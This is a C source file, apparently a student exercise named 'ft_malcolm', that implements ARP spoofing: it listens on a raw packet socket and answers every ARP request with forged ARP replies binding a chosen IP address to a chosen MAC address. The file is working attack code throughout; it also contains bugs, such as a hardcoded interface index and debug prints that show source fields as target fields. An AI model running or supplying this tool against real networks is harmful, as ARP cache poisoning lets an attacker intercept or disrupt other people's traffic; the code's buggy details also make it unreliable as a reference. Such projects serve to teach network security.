#include "ft_malcolm.h"


void    get_interface_enabled(struct malcolm *arp) {

    struct ifaddrs *ifa, *ifatemp;
    int i = 0, size = 0;
    if (getifaddrs(&ifa) == -1) {
        perror("Interface:");
        return ;
    }
    ifatemp = ifa;
    size = sizelist(&ifa) / 2;
    arp->interface = malloc(sizeof(char *) * size);
    while(i < size - 1) {
        arp->interface[i] = strdup(ifa->ifa_name);
        ifa = ifa->ifa_next;
        i++;    
    }
    ifa = ifatemp;
    arp->interface[i] = NULL;
    freeifaddrs(ifa);
}

bool check_ip_argument(struct malcolm arp, char *ip, int *iffindex) {

    int i = 0;
    int ifindex = 0;
    char *ipt = NULL;

    while (arp.interface[i]) 
    {
        ipt = get_ip_address(arp.interface[i], &ifindex);
        //if (!ipt)
        //    continue ;
        if (ipt) {
            if (strcmp(ipt, (char *)ip) == 0) {
                *iffindex = ifindex;
                return (true);
            }
        }
        i++;
    }
    return (false);
}

void    send_arp(struct malcolm *arp) {

    // init struct sockaddr_ll
    struct sockaddr_ll  sockaddr;
    struct ethhdr       *ethhdr;
    struct arpHdr       *arphdr;
    char    buffer[SIZE_ARP];

    // for bind socket with struct sockaddr_ll
    int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (fd < 1) {
        perror("Socket:");
        return ;
    }

    memset(&sockaddr, 0, sizeof(struct sockaddr_ll));
    sockaddr.sll_family = AF_PACKET;
    sockaddr.sll_ifindex = arp->interfaceidx;
    if (bind(fd, (struct sockaddr*)&sockaddr, sizeof(struct sockaddr_ll)) < 0) {
        perror("Bind:");
        return ;
    }

    memset(buffer, 0x00, SIZE_ARP);
    ethhdr = (struct ethhdr *)buffer;
    arphdr = (struct arpHdr *)(buffer + 14); // size header = 42 -> size arp packet
    sockaddr.sll_family = AF_PACKET;
    sockaddr.sll_protocol = htons(ETH_P_ARP); // 0x0806 for ARP protocol
    sockaddr.sll_ifindex = 2;
    sockaddr.sll_hatype = htons(ARPHRD_ETHER);
    sockaddr.sll_pkttype = PACKET_BROADCAST;
    sockaddr.sll_halen = SIZE_MAC_ADDRESS;
    sockaddr.sll_addr[6] = 0x00;
    sockaddr.sll_addr[7] = 0x00;

    //  set header ethernet header
    //memset(ethhdr->h_dest, 0xff, SIZE_MAC_ADDRESS);
    //memcpy(ethhdr->h_dest, arp->target.int_mac, SIZE_MAC_ADDRESS);   

    for (int i = 0; i < SIZE_MAC_ADDRESS; i++) {
        ethhdr->h_dest[i] = arp->target.int_mac[i];

        ethhdr->h_source[i] = arp->source.int_mac[i];
        arphdr->__ar_sha[i] = arp->source.int_mac[i];
        arphdr->__ar_tha[i] = arp->target.int_mac[i];
        sockaddr.sll_addr[i] = arp->source.int_mac[i];
    }
    //printf("\n%02x:%02x:%02x:%02x:%02x:%02x\n", ethhdr->h_source[0], ethhdr->h_source[1], ethhdr->h_source[2], ethhdr->h_source[3], ethhdr->h_source[4], ethhdr->h_source[5]);
    //printf("\n%02x:%02x:%02x:%02x:%02x:%02x\n", ethhdr->h_dest[0], ethhdr->h_dest[1], ethhdr->h_dest[2], ethhdr->h_dest[3], ethhdr->h_dest[4], ethhdr->h_dest[5]);
    //printf("\n%02x:%02x:%02x:%02x:%02x:%02x\n", arp->target.int_mac[0], arp->target.int_mac[1], arp->target.int_mac[2], arp->target.int_mac[3], arp->target.int_mac[4], arp->target.int_mac[5]);
    //printf("\n%02x:%02x:%02x:%02x:%02x:%02x\n", ethhdr->h_dest[0], ethhdr->h_dest[1], ethhdr->h_dest[2], ethhdr->h_dest[3], ethhdr->h_dest[4], ethhdr->h_dest[5]);
    printf("interface = %d\n", arp->interfaceidx);

    ethhdr->h_proto = htons(ETH_P_ARP); // 0x0806 ARP protocol 

    // set header arp 
    arphdr->ar_hrd = htons(HW_ADDR);
    arphdr->ar_pro = htons(ETH_P_IP); 
    arphdr->ar_hln = SIZE_MAC_ADDRESS;
    arphdr->ar_pln = SIZE_IPV4_ADDRESS;
    arphdr->ar_op = ARPOP_REPLY; // reply arp

    for (int i = 0; i < SIZE_IPV4_ADDRESS; i++) {
        arphdr->__ar_sip[i] = arp->source.int_ip[i];
        arphdr->__ar_tip[i] = arp->target.int_ip[i];
    }
    //memcpy(arphdr->__ar_sip, arp->source.ip, SIZE_IPV4_ADDRESS); // source ip
    //memcpy(arphdr->__ar_tip, arp->target.ip, SIZE_IPV4_ADDRESS); // target ip
    // send arp packet with sockaddr_ll

    for (int i = 0; i < 5; i++) {
        int ret = sendto(fd, buffer, SIZE_ARP, 0, (struct sockaddr *)&sockaddr, sizeof(sockaddr));
        if (ret == -1) {
            perror("Send:");
            return ;
        }
    }
    printf("SEND\n");
    printf("Source IP: %d.%d.%d.%d\n", arphdr->__ar_sip[0], arphdr->__ar_sip[1], arphdr->__ar_sip[2], arphdr->__ar_sip[3]);
    printf("Source MAC:%02x:%02x:%02x:%02x:%02x:%02x\n", arphdr->__ar_sha[0], arphdr->__ar_sha[1], arphdr->__ar_sha[2], arphdr->__ar_sha[3], arphdr->__ar_sha[4], arphdr->__ar_sha[5]);
    printf("Target IP: %d.%d.%d.%d\n", arphdr->__ar_tip[0], arphdr->__ar_tip[1], arphdr->__ar_tip[2], arphdr->__ar_tip[3]);
    printf("Target MAC:%02x:%02x:%02x:%02x:%02x:%02x\n", arphdr->__ar_tha[0], arphdr->__ar_tha[1], arphdr->__ar_tha[2], arphdr->__ar_tha[3], arphdr->__ar_tha[4], arphdr->__ar_tha[5]);

}

void    waiting_arp(struct malcolm *arp) {

    (void)arp;
    ssize_t data_size = 0;
    int sockfd;
    unsigned char buffer[SIZE_ARP];
    
    struct ethhdr *ethhdr;
    struct arpHdr *arphdr;

    // use sudo 
    sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP)); 
    if (sockfd < 0) {
        perror("Socket");
        return ; 
    }

    while (1) 
    {
        data_size = recvfrom(sockfd, buffer, SIZE_ARP, 0, NULL, NULL);
        if (data_size < 0) {
            perror("Receive");
            return ;
        }
        // get header eth
        ethhdr = (struct ethhdr *)buffer;

        // check arp packet
        if (ntohs(ethhdr->h_proto) == ETH_P_ARP) {
            // get arp header
            arphdr = (struct arpHdr *)(buffer + sizeof(struct ethhdr));

            // verif si l'ARP est une demande (ARP Request) ou une reponse (ARP Reply)
            if (ntohs(arphdr->ar_op) == ARPOP_REQUEST)
            {
                printf("ARP Request:\n");
                print_ip("source", arphdr->__ar_sip);
                print_mac("source", arphdr->__ar_tha);
                print_ip("target", arphdr->__ar_sip);
                print_mac("target", arphdr->__ar_tha);
                send_arp(arp);
                // send ARP packet with spoofing if ARPOP_REQUEST
            } 
            else if (ntohs(arphdr->ar_op) == ARPOP_REPLY)
            {
                printf("ARP Reply:\n");
                print_ip("source", arphdr->__ar_sip);
                print_mac("source", arphdr->__ar_tha);
                print_ip("target", arphdr->__ar_sip);
                print_mac("target", arphdr->__ar_tha);
                //send_arp(arp);

            }
        }
    }
}

// check l'ip et l'adresse mac des arg avec la meme interface
int main(int argc, char **argv) {

    //(void)argc;
    //(void)argv; 
    if (argc != 5) {
        dprintf(2, "Error: arguments\n\n");
        help();
        return (1);
    }
    struct malcolm arp;

    parse_arg(argv, &arp);
    get_interface_enabled(&arp);

    bool source = check_ip_argument(arp, arp.source.ip, &arp.interfaceidx);
    bool target = check_ip_argument(arp, arp.target.ip, &arp.interfaceidx);

    ipto_int(&arp);
    macto_int(&arp);

    printf("Source str IP: %s\n", arp.source.ip);
    printf("Target str IP: %s\n", arp.target.ip);
    /*for (int i = 0; i < SIZE_IPV4_ADDRESS; i++) {
        printf("%d.", arp.source.int_ip[i]);
    }*/
    printf("\n");
    source = check_mac_address(&arp, arp.source.mac);
    target = check_mac_address(&arp, arp.target.mac);
    if (source == false || target == false) {
        dprintf(2, "IP or mac error\n");
        return (1);
    }
    waiting_arp(&arp);

    free_interface(&arp);
    return (0);
}

